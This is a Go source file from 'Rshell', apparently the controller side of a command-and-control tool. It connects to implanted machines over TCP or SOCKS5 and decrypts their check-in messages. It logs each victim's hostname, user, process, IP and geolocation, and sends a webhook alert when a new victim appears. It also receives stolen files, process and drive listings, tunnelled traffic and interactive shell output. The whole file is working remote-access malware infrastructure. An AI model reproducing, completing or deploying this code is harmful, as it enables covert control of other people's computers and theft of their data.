package tcp

import (
	"Rshell/pkg/command"
	"Rshell/pkg/connection"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/interactive"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"Rshell/pkg/utils"
	"Rshell/pkg/webhooks"
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

// TCPForwardConfig TCP正向连接配置
type TCPForwardConfig struct {
	ServerAddress string            // 目标服务器地址 (host:port)
	Socks5Proxy   string            // SOCKS5代理地址 如: 127.0.0.1:1080
	Auth          map[string]string // 认证信息 (如果需要)
	Timeout       time.Duration     // 连接超时时间
	MaxRetries    int               // 最大重试次数
	RetryDelay    time.Duration     // 重试延迟
	Reconnect     bool              // 是否自动重连
}

// TCPForwardConnector TCP正向连接器
type TCPForwardConnector struct {
	Config         *TCPForwardConfig
	client         *TCPClient
	retryCount     int
	reconnectMu    sync.RWMutex
	isReconnecting bool
	stopReconnect  chan struct{}
}

// NewTCPForwardConnector 创建新的TCP正向连接器
func NewTCPForwardConnector(config *TCPForwardConfig) *TCPForwardConnector {
	if config.Timeout == 0 {
		config.Timeout = 30 * time.Second
	}
	if config.MaxRetries == 0 {
		config.MaxRetries = 3
	}
	if config.RetryDelay == 0 {
		config.RetryDelay = 5 * time.Second
	}

	return &TCPForwardConnector{
		Config:        config,
		stopReconnect: make(chan struct{}),
	}
}

// connectWithProxy 通过SOCKS5代理建立TCP连接
func (fc *TCPForwardConnector) connectWithProxy() (net.Conn, error) {
	// 创建SOCKS5拨号器
	dialer, err := proxy.SOCKS5("tcp", fc.Config.Socks5Proxy, nil, &net.Dialer{
		Timeout: fc.Config.Timeout,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to create SOCKS5 dialer: %w", err)
	}

	// 建立TCP连接
	conn, err := dialer.Dial("tcp", fc.Config.ServerAddress)
	if err != nil {
		return nil, fmt.Errorf("failed to dial TCP via proxy: %w", err)
	}

	return conn, nil
}

// connectDirect 直接建立TCP连接（无代理）
func (fc *TCPForwardConnector) connectDirect() (net.Conn, error) {
	dialer := &net.Dialer{
		Timeout: fc.Config.Timeout,
	}

	conn, err := dialer.Dial("tcp", fc.Config.ServerAddress)
	if err != nil {
		return nil, fmt.Errorf("failed to dial TCP: %w", err)
	}

	return conn, nil
}

// Connect 建立TCP正向连接
func (fc *TCPForwardConnector) Connect() (*TCPClient, error) {
	var conn net.Conn
	var err error

	logger.Info("[DEBUG] TCP Forward connecting to:", fc.Config.ServerAddress)

	if fc.Config.Socks5Proxy != "" {
		logger.Info("[DEBUG] TCP Forward using SOCKS5 proxy:", fc.Config.Socks5Proxy)
		conn, err = fc.connectWithProxy()
	} else {
		conn, err = fc.connectDirect()
	}

	if err != nil {
		logger.Error("[DEBUG] TCP Forward connect FAILED:", err)
		return nil, err
	}
	logger.Info("[DEBUG] TCP Forward connected to:", fc.Config.ServerAddress)

	// 获取对方的IP地址
	remoteAddr := fc.getRemoteAddr(conn)

	// 生成临时UID
	tempUID := generateTempTCPUID(remoteAddr)

	// 创建TCPClient（复用已有的结构）
	client := &TCPClient{
		Conn:          conn,
		UID:           tempUID, // 临时UID，等待FirstBlood更新
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReaderSize(conn, 1024*1024), // 1MB缓冲区
	}

	// 保存客户端引用
	fc.client = client
	fc.retryCount = 0

	// 设置连接参数
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	logger.Info("TCP forward connection established to:", fc.Config.ServerAddress, "Remote IP:", remoteAddr)

	// 启动消息处理协程
	go fc.handleMessages()

	// 启动心跳检查
	go client.startHeartbeatCheck()

	// 如果需要自动重连，启动重连监听
	if fc.Config.Reconnect {
		go fc.startReconnectListener()
	}

	return client, nil
}

// getRemoteAddr 获取对方的IP地址
func (fc *TCPForwardConnector) getRemoteAddr(conn net.Conn) string {
	remoteAddr := conn.RemoteAddr()
	if remoteAddr != nil {
		if host, _, err := net.SplitHostPort(remoteAddr.String()); err == nil {
			return host
		}
		return remoteAddr.String()
	}

	// 如果无法获取，从服务器地址中提取
	if host, _, err := net.SplitHostPort(fc.Config.ServerAddress); err == nil {
		return host
	}

	return "unknown"
}

// generateTempTCPUID 生成临时TCP UID
func generateTempTCPUID(remoteAddr string) string {
	timestamp := time.Now().UnixNano()
	return fmt.Sprintf("temp_%s_%d", remoteAddr, timestamp)
}

// handleMessages 处理接收到的TCP消息
func (fc *TCPForwardConnector) handleMessages() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("TCP forward message handler panic recovered:", r)
		}
	}()

	for {
		if fc.client == nil || fc.client.IsClosed {
			break
		}

		// 重置读取超时
		fc.client.Conn.SetReadDeadline(time.Now().Add(30 * time.Second))

		// 1. 读取消息长度
		var length uint32
		err := binary.Read(fc.client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err.Error() == "EOF" {
				logger.Info("Server closed TCP connection for client:", fc.client.UID)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("TCP forward read timeout for client:", fc.client.UID)
			} else {
				logger.Error("Error reading message length in forward TCP:", err, "for client:", fc.client.UID)
			}

			// 如果开启了自动重连，标记为需要重连
			if fc.shouldReconnect() {
				fc.handleDisconnect()
			}
			break
		}

		// 验证消息长度
		if length == 0 {
			logger.Warn("Received zero-length message in forward TCP for client:", fc.client.UID)
			continue
		}

		if length < 4 {
			logger.Error("Message length too short in forward TCP:", length, "for client:", fc.client.UID)
			break
		}

		// 2. 读取消息内容
		message := make([]byte, length)
		bytesRead, err := io.ReadFull(fc.client.Reader, message)
		if err != nil {
			if err.Error() == "EOF" {
				logger.Info("Server closed connection while reading for client:", fc.client.UID)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("TCP forward read content timeout for client:", fc.client.UID)
			} else {
				logger.Error("Error reading message content in forward TCP:", err, "for client:", fc.client.UID)
			}

			if fc.shouldReconnect() {
				fc.handleDisconnect()
			}
			break
		}

		// 验证实际读取的字节数
		if uint32(bytesRead) != length {
			logger.Error("Message length mismatch in forward TCP, expected:", length, "actual:", bytesRead)
			break
		}

		// 3. 处理消息
		fc.processForwardMessage(message)
	}
}

// processForwardMessage 处理正向TCP消息
func (fc *TCPForwardConnector) processForwardMessage(message []byte) {
	if len(message) < 4 {
		logger.Error("Message too short in forward TCP")
		return
	}

	msgType := binary.BigEndian.Uint32(message[:4])

	logger.Info(fmt.Sprintf("[DEBUG] TCP Forward received message: type=%d len=%d", binary.BigEndian.Uint32(message[:4]), len(message)))

	switch msgType {
	case 1: // firstBlood
		logger.Info("[DEBUG] TCP Forward processing firstBlood")
		if len(message) < 5 {
			logger.Error("[DEBUG] FirstBlood message too short in forward TCP")
			break
		}

		msg := message[4:]
		if len(msg) == 0 {
			logger.Error("[DEBUG] Empty FirstBlood payload in forward TCP")
			break
		}
		logger.Info(fmt.Sprintf("[DEBUG] TCP Forward firstBlood payload length: %d", len(msg)))

		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			logger.Error("[DEBUG] DecodeBase64 failed in forward TCP:", err)
			break
		}
		logger.Info(fmt.Sprintf("[DEBUG] TCP Forward base64 decoded: %d bytes", len(tmpMetainfo)))

		metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
		if err != nil {
			logger.Error("[DEBUG] DecryptNormal failed in forward TCP:", err)
			break
		}
		logger.Info(fmt.Sprintf("[DEBUG] TCP Forward DecryptNormal success: %d bytes", len(metainfo)))

		if len(metainfo) < 9 {
			logger.Error(fmt.Sprintf("[DEBUG] Metainfo too short in forward TCP: %d", len(metainfo)))
			break
		}

		uid := encrypt.BytesToMD5(metainfo)
		logger.Info(fmt.Sprintf("[DEBUG] TCP Forward firstBlood UID: %s", uid))

		// 更新客户端UID
		oldUID := fc.client.UID
		fc.client.UID = uid
		fc.client.LastHeartbeat = time.Now()
		fc.client.TimeoutCount = 0

		// 添加UID映射，用于处理临时UID到正式UID的转换
		connection.GlobalUIDMapper.AddMapping(oldUID, uid)

		// 从全局管理器中移除旧的临时客户端
		globalTCPClientManager.Remove(oldUID)

		// 添加到全局管理器（使用新的UID）
		globalTCPClientManager.Add(uid, fc.client)

		// 更新连接类型
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, oldUID) // 删除旧的
		connection.ClientListenerType[uid] = "tcp"
		connection.MuClientListenerType.Unlock()

		// 获取服务器IP
		externalIp := fc.getServerIP()

		// 检查客户端是否已存在
		var existingClient database.Clients
		exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

		if !exists { // FirstBlood
			if len(metainfo) < 9 {
				logger.Error("Metainfo too short for parsing in forward TCP")
				break
			}

			publicKey := metainfo[:32]
			metainfo = metainfo[32:]
			processID := binary.BigEndian.Uint32(metainfo[:4])
			flag := int(metainfo[4])

			if len(metainfo) < 9 {
				logger.Error("Metainfo insufficient for IP parsing in forward TCP")
				break
			}

			ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
			localIP := utils.Uint32ToIP(ipInt).String()

			// 安全地获取osInfo
			var osInfo string
			if len(metainfo) > 9 {
				osInfo = string(metainfo[9:])
			}

			// 验证osInfo格式
			osArray := strings.Split(osInfo, "\t")
			if len(osArray) != 3 {
				logger.Error("Invalid osInfo format in forward TCP, expected 3 parts, got:", len(osArray))
				osArray = []string{"Unknown", "Unknown", "Unknown"}
			}

			hostName := osArray[0]
			UserName := osArray[1]
			processName := osArray[2]

			// 如果外部IP未知，使用本地IP
			if externalIp == "unknown" || externalIp == "" {
				externalIp = localIP
			}

			// 验证IP地址
			if net.ParseIP(externalIp) == nil {
				externalIp = "0.0.0.0"
			}

			// 获取地理位置
			address, _ := qqwry.GetLocationByIP(externalIp)

			currentTime := time.Now()
			timeFormat := "01-02 15:04"
			formattedTime := currentTime.Format(timeFormat)

			arch := "x86"

			if flag > 8 {
				UserName += "*"
				flag = flag - 8
			}
			if flag > 4 {
				arch = "x64"
			}

			// 创建新客户端记录
			c := database.Clients{
				Uid:        uid,
				FirstStart: formattedTime,
				ExternalIP: externalIp,
				InternalIP: localIP,
				Username:   UserName,
				Computer:   hostName,
				Process:    processName,
				Pid:        strconv.Itoa(int(processID)),
				Address:    address,
				Arch:       arch,
				Note:       "",
				Sleep:      "0",
				Online:     "1",
				Color:      "",
				PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
			}
			encrypt.PublicKeyMap[uid] = base64.StdEncoding.EncodeToString(publicKey[:])

			// 插入数据库
			if _, err := database.Engine.Insert(&c); err != nil {
				logger.Error("Failed to insert client in forward TCP:", err)
			}

			// 插入相关表
			database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
			database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

			// 发送Webhook通知
			go webhooks.NotifyOnline(c)

			logger.Info("New client registered via TCP forward connection:", uid, "IP:", externalIp)
		} else {
			// 更新在线状态
			database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
			logger.Info("Client reconnected via TCP forward connection:", uid)
		}

	case 2: // otherMsg
		if len(message) < 8 { // 至少需要类型+4字节长度+部分数据
			//logger.Error("OtherMsg message too short from:", conn.RemoteAddr())
			break
		}

		msg := message[4:]
		if len(msg) < 4 {
			logger.Error("OtherMsg too short")
			break
		}

		metaLen := binary.BigEndian.Uint32(msg[:4])

		// 验证metaLen
		if metaLen > uint32(len(msg)-4) {
			logger.Error("Invalid meta length:", metaLen, "available:", len(msg)-4)
			break
		}

		if metaLen == 0 {
			logger.Error("Zero meta length")
			break
		}

		metaMsg := msg[4 : 4+metaLen]
		realMsg := msg[4+metaLen:]

		// 验证realMsg不为空
		if len(realMsg) == 0 {
			logger.Error("Empty real message")
			break
		}

		tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
		if err != nil {
			logger.Error("DecodeBase64 failed:", err)
			break
		}

		metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
		if err != nil {
			logger.Error("Decrypt failed:", err)
			break
		}

		uid := encrypt.BytesToMD5(metainfo)

		// 检查客户端是否在线
		if _, exists := globalTCPClientManager.Get(uid); !exists {
			logger.Warn("Received message from offline TCP client:", uid)
			break
		}

		dataBytes, err := encrypt.DecodeBase64(realMsg)
		if err != nil {
			logger.Error("DecodeBase64 failed:", err)
			break
		}

		dataBytes, err = encrypt.Decrypt(dataBytes, uid)
		if err != nil {
			logger.Error("First decrypt failed:", err)
			break
		}

		dataBytes, err = encrypt.Decrypt(dataBytes, uid)
		if err != nil {
			logger.Error("Second decrypt failed:", err)
			break
		}

		// 修复的关键点：严格检查dataBytes长度
		if len(dataBytes) < 4 {
			logger.Error("Decrypted data too short:", len(dataBytes))
			break
		}

		replyTypeBytes := dataBytes[:4]
		data := dataBytes[4:]
		replyType := binary.BigEndian.Uint32(replyTypeBytes)

		// 根据replyType进行不同的边界检查
		switch replyType {
		case 0, 31: // 命令行展示或错误展示
			var shell database.Shell
			if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
				if replyType == 31 {
					shell.ShellContent += "!Error: "
				}
				if len(data) > 0 {
					shell.ShellContent += string(data) + "\n"
				}
				database.Engine.Where("uid = ?", uid).Update(&shell)
			}

		case command.PS:
			if len(data) > 0 {
				command.VarPidQueue.Add(uid, string(data))
			}

		case command.FileBrowse:
			if len(data) > 0 {
				command.VarFileBrowserQueue.Add(uid, string(data))
			}

		case 22: // 文件下载第一条信息
			if len(data) < 8 { // 至少4字节长度+部分路径
				logger.Error("File download info too short")
				break
			}

			fileLen := int(binary.BigEndian.Uint32(data[:4]))
			if len(data) < 4 {
				logger.Error("No file path in download info")
				break
			}

			filePath := string(data[4:])
			if filePath == "" {
				logger.Error("Empty file path")
				break
			}

			// 使用安全路径函数
			fullPath, err := utils.GetSafeFilePath(uid, filePath)
			if err != nil {
				logger.Error("Security check failed:", err)
				break
			}

			// 确保下载目录存在
			downloadDir := filepath.Dir(fullPath)
			if err := os.MkdirAll(downloadDir, 0755); err != nil {
				logger.Error("Failed to create download directory:", err)
				break
			}

			// 更新数据库
			sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
			_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
			if err != nil {
				logger.Error("Database update failed:", err)
			}

			// 检查并删除已存在的文件
			if _, err := os.Stat(fullPath); err == nil {
				if err := os.Remove(fullPath); err != nil {
					logger.Error("Failed to remove existing file:", err)
					break
				}
			}

			// 创建新文件
			fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
			if err != nil {
				logger.Error("Failed to create file:", err)
				break
			}
			fp.Close()

		case command.DOWNLOAD: // 文件下载
			if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
				logger.Error("Download data too short")
				break
			}

			filePathLen := int(binary.BigEndian.Uint32(data[:4]))
			if len(data) < 4+filePathLen {
				logger.Error("Invalid file path length in download")
				break
			}

			if filePathLen == 0 {
				logger.Error("Zero file path length")
				break
			}

			filePath := string(data[4 : 4+filePathLen])
			fileContent := data[4+filePathLen:]

			// 使用安全路径函数
			fullPath, err := utils.GetSafeFilePath(uid, filePath)
			if err != nil {
				logger.Error("Security check failed:", err)
				break
			}
			utils.Filelock.Lock()
			var fileDownloads database.Downloads
			if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
				fileDownloads.DownloadedSize += len(fileContent)
				database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
			}
			utils.Filelock.Unlock()
			// 确保目录存在
			downloadDir := filepath.Dir(fullPath)
			if err := os.MkdirAll(downloadDir, 0755); err != nil {
				logger.Error("Failed to create download directory:", err)
				break
			}

			// 追加文件内容
			fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
			if err != nil {
				logger.Error("Failed to open file:", err)
				break
			}

			if _, err := fp.Write(fileContent); err != nil {
				logger.Error("Failed to write file content:", err)
			}
			fp.Close()

		case command.DRIVES:
			if len(data) > 0 {
				drives := utils.GetExistingDrives(data)
				command.VarDrivesQueue.Add(uid, drives)
			}

		case command.FileContent:
			if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
				logger.Error("File content data too short")
				break
			}

			filePathLen := int(binary.BigEndian.Uint32(data[:4]))
			if len(data) < 4+filePathLen {
				logger.Error("Invalid file path length in file content")
				break
			}

			if filePathLen == 0 {
				logger.Error("Zero file path length")
				break
			}

			filePath := string(data[4 : 4+filePathLen])
			fileContent := data[4+filePathLen:]
			command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

		case command.Socks5Data:
			if len(data) < 16 {
				logger.Error("Socks5 data too short")
				break
			}

			md5sign := data[:16]
			rawData := data[16:]
			command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
		case command.WriteInteractieShell:
			sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))

			sessionID := string(data[4 : 4+sessionIDLen])
			output := data[4+sessionIDLen:]

			interactive.SendOutputToSession(uid, sessionID, output)
		default:
			logger.Warn("Unknown TCP reply type:", replyType)
		}

	case 3: // heartBeat
		if len(message) < 5 {
			logger.Error("HeartBeat message too short in forward TCP")
			break
		}

		msg := message[4:]
		if len(msg) == 0 {
			logger.Error("Empty HeartBeat payload in forward TCP")
			break
		}

		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			logger.Error("DecodeBase64 failed in forward TCP:", err)
			break
		}

		metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
		if err != nil {
			logger.Error("Decrypt failed in forward TCP:", err)
			break
		}

		uid := encrypt.BytesToMD5(metainfo)

		// 更新心跳时间
		if c, exists := globalTCPClientManager.Get(uid); exists && !c.IsClosed {
			c.LastHeartbeat = time.Now()
			c.TimeoutCount = 0
		}

	default:
		logger.Warn("Unknown TCP message type in forward connection:", msgType)
	}
}

// getServerIP 从服务器地址中获取IP
func (fc *TCPForwardConnector) getServerIP() string {
	if fc.Config.ServerAddress == "" {
		return "unknown"
	}

	// 解析服务器地址
	if host, _, err := net.SplitHostPort(fc.Config.ServerAddress); err == nil {
		// 尝试解析为主机名或IP
		if net.ParseIP(host) != nil {
			return host // 已经是IP
		}

		// 如果是域名，尝试解析
		ips, err := net.LookupIP(host)
		if err != nil || len(ips) == 0 {
			return host // 返回域名
		}

		// 返回第一个IPv4地址
		for _, ip := range ips {
			if ip.To4() != nil {
				return ip.String()
			}
		}

		// 如果没有IPv4，返回第一个IPv6
		if len(ips) > 0 {
			return ips[0].String()
		}
	}

	return "unknown"
}

// handleDisconnect 处理断开连接
func (fc *TCPForwardConnector) handleDisconnect() {
	fc.reconnectMu.Lock()

	// 如果已经在重连中，直接返回
	if fc.isReconnecting {
		fc.reconnectMu.Unlock()
		return
	}

	// 标记为重连状态
	fc.isReconnecting = true
	fc.reconnectMu.Unlock()

	// 异步执行重连
	go fc.reconnect()
}

// shouldReconnect 检查是否应该重连
func (fc *TCPForwardConnector) shouldReconnect() bool {
	if !fc.Config.Reconnect {
		return false
	}

	// 如果已经超过最大重试次数，不再重连
	if fc.retryCount >= fc.Config.MaxRetries {
		return false
	}

	return true
}

// reconnect 重新连接
func (fc *TCPForwardConnector) reconnect() {
	defer func() {
		fc.reconnectMu.Lock()
		fc.isReconnecting = false
		fc.reconnectMu.Unlock()
	}()

	startAttempt := fc.retryCount + 1
	if startAttempt > fc.Config.MaxRetries {
		return
	}

	logger.Info(fmt.Sprintf("Starting TCP reconnection process for forward client (attempt %d/%d)...",
		startAttempt, fc.Config.MaxRetries))

	for attempt := startAttempt; attempt <= fc.Config.MaxRetries; attempt++ {
		select {
		case <-fc.stopReconnect:
			logger.Info("TCP reconnection stopped by user for forward client")
			return
		default:
			fc.retryCount = attempt

			logger.Info(fmt.Sprintf("Attempting to reconnect TCP forward client (attempt %d/%d)...",
				attempt, fc.Config.MaxRetries))

			if attempt > startAttempt {
				time.Sleep(fc.Config.RetryDelay)
			}

			err := fc.attemptReconnect()
			if err == nil {
				fc.retryCount = 0
				logger.Info("TCP forward client reconnected successfully")
				return
			}

			logger.Warn(fmt.Sprintf("TCP reconnection attempt %d failed: %v", attempt, err))

			if attempt == fc.Config.MaxRetries {
				logger.Error(fmt.Sprintf("Max TCP reconnection attempts (%d) reached for forward client. Giving up.",
					fc.Config.MaxRetries))
				if fc.client != nil && !fc.client.IsClosed {
					fc.client.Close()
				}
				return
			}
		}
	}
}

// attemptReconnect 尝试重新建立TCP连接
func (fc *TCPForwardConnector) attemptReconnect() error {
	// 清理旧的连接
	if fc.client != nil && !fc.client.IsClosed {
		fc.client.Close()
	}

	// 尝试建立新连接
	var conn net.Conn
	var err error

	if fc.Config.Socks5Proxy != "" {
		conn, err = fc.connectWithProxy()
	} else {
		conn, err = fc.connectDirect()
	}

	if err != nil {
		return fmt.Errorf("failed to reconnect TCP: %w", err)
	}

	// 重新初始化客户端
	remoteAddr := fc.getRemoteAddr(conn)

	// 如果没有UID，生成临时UID
	tempUID := fc.client.UID
	if tempUID == "" {
		tempUID = generateTempTCPUID(remoteAddr)
	}

	// 创建新的TCPClient
	client := &TCPClient{
		Conn:          conn,
		UID:           tempUID,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReaderSize(conn, 1024*1024),
	}

	// 更新客户端引用
	fc.client = client

	// 设置连接参数
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// 启动消息处理协程
	go fc.handleMessages()

	// 启动心跳检查
	go client.startHeartbeatCheck()

	logger.Info("TCP forward reconnection established to:", fc.Config.ServerAddress,
		"Remote IP:", remoteAddr, "UID:", tempUID)

	return nil
}

// startReconnectListener 启动重连监听
func (fc *TCPForwardConnector) startReconnectListener() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if fc.client != nil && fc.client.IsClosed && fc.shouldReconnect() {
				fc.handleDisconnect()
			}
		case <-fc.stopReconnect:
			return
		}
	}
}

// Close 关闭TCP正向连接器
func (fc *TCPForwardConnector) Close() {
	close(fc.stopReconnect)

	if fc.client != nil {
		// 从全局管理器移除
		globalTCPClientManager.Remove(fc.client.UID)
	}
}

// StartTCPForwardClient 启动TCP正向客户端的便捷函数
func StartTCPForwardClient(config *TCPForwardConfig) (*TCPClient, error) {
	connector := NewTCPForwardConnector(config)
	return connector.Connect()
}

// ExampleTCPUsage TCP正向连接使用示例
func ExampleTCPUsage() {
	// 配置TCP正向连接
	config := &TCPForwardConfig{
		ServerAddress: "your-server.com:8080", // TCP服务器地址
		Socks5Proxy:   "127.0.0.1:1080",       // 如果需要代理
		Timeout:       30 * time.Second,
		MaxRetries:    5,
		RetryDelay:    10 * time.Second,
		Reconnect:     true,
	}

	// 启动TCP正向客户端
	client, err := StartTCPForwardClient(config)
	if err != nil {
		logger.Error("Failed to start TCP forward client:", err)
		return
	}

	// 注意：此时client.UID是临时值
	// 等待FirstBlood消息后，UID会被更新
	logger.Info("TCP forward client started, waiting for FirstBlood message. Temp UID:", client.UID)

	// 检查UID是否已更新
	go func() {
		time.Sleep(5 * time.Second)

		if strings.HasPrefix(client.UID, "tcp_temp_") {
			logger.Warn("TCP forward client still using temp UID after 5 seconds:", client.UID)
		} else {
			logger.Info("TCP forward client UID updated:", client.UID)
		}
	}()
}
